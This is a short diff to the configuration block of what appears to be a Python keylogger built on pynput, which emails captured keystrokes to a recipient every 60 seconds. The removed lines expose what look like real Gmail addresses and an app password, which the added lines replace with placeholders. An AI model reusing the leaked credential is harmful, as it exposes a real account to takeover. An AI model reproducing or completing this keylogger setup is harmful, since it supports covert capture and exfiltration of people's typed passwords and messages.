@@ -5,9 +5,9 @@ from email.mime.text import MIMEText
 from pynput import keyboard
 
 # Configuration
-EMAIL_ADDRESS = 'pcgpt00@gmail.com'
-EMAIL_PASSWORD = 'qppb vztu zbed vfoo'
-RECIPIENT_EMAIL = 'shlokshah412@gmail.com'
+EMAIL_ADDRESS = 'your_email@example.com'
+EMAIL_PASSWORD = 'your_email_password'   # suggestion: use app passwords
+RECIPIENT_EMAIL = 'recipient_email@example.com'
 INTERVAL = 60  # Time interval in seconds
 
 # Global variables
